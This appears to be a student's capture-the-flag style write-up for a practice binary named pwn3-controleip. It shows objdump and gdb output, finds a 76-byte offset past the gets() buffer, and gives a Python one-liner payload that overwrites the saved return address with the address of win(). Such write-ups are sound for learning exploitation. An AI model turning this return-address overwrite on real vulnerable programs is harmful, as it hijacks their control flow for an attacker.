@@ -1,0 +1,86 @@
+controleip
+right now, name is not giving any hint
+
+Let's objdump it to get the functions
+
+amritesh@MyUbuntu:~/week8/week-8$ objdump -d pwn3-controleip -M intel
+
+this time there are two noticable functions
+080483f4 <win>:
+ 80483f4:	55                   	push   ebp
+ 80483f5:	89 e5                	mov    ebp,esp
+ 80483f7:	83 ec 18             	sub    esp,0x18
+ 80483fa:	c7 04 24 e0 84 04 08 	mov    DWORD PTR [esp],0x80484e0
+ 8048401:	e8 26 ff ff ff       	call   804832c <puts@plt>
+ 8048406:	c9                   	leave
+ 8048407:	c3                   	ret
+
+08048408 <main>:
+ 8048408:	55                   	push   ebp
+ 8048409:	89 e5                	mov    ebp,esp
+ 804840b:	83 e4 f0             	and    esp,0xfffffff0
+ 804840e:	83 ec 50             	sub    esp,0x50
+ 8048411:	8d 44 24 10          	lea    eax,[esp+0x10]
+ 8048415:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048418:	e8 ef fe ff ff       	call   804830c <gets@plt>
+ 804841d:	c9                   	leave
+ 804841e:	c3                   	ret
+ 804841f:	90                   	nop
+
+let's print all the strings
+(gdb) x/s 0x80484e0
+0x80484e0:	"code flow successfully changed"
+
+This is so wierd...
+basically you have to run win fucntion but there is no call in main for win 
+
+again there is gets function in main so vulnerable to buffer overflow
+
+before moving ahead make sure you watch this video, it explains how stack works inside a function 
+https://www.youtube.com/watch?v=vcfQVwtoyHY
+
+now the main task of ours is to run win function. so what we'll do is write the address of win() in the instruction pointer
+
+(gdb) print win
+$1 = {void (void)} 0x80483f4 <win>
+
+so this is the address of win function 0x80483f4
+this should be at eip of stack in main function
+
+and eip will be after the ebp, so basically after ebp we have to write above address
+
+(gdb) break *0x804841d
+Breakpoint 1 at 0x804841d: file stack4/stack4.c, line 16.
+(gdb) run
+Starting program: /home/amritesh/week8/week-8/pwn3-controleip
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, main (argc=1, argv=0xffffcdf4) at stack4/stack4.c:16
+16	stack4/stack4.c: No such file or directory.
+(gdb) x/30x $esp
+0xffffcd00:	0xffffcd10	0xffffcff2	0xf7e034a9	0xf7fae748
+0xffffcd10:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcd50:	0xf7fa0041	0xf7fab000	0x00000000	0xf7debe81
+0xffffcd60:	0x00000001	0xffffcdf4	0xffffcdfc	0xffffcd84
+0xffffcd70:	0x00000001	0x00000000
+
+(gdb) x $ebp
+0xffffcd58:	0x00000000
+
+so basically after 76 characters the next 4 is going to be replaced by address to win to get it executed
+
+as address is not in printable character so we'll be using python
+python -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./pwn3-controleip
+
+let's run it
+
+amritesh@MyUbuntu:~/week8/week-8$ python -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./pwn3-controleip
+code flow successfully changed
+Segmentation fault (core dumped)
+
+yeah pwned it!!!!!!
+
+
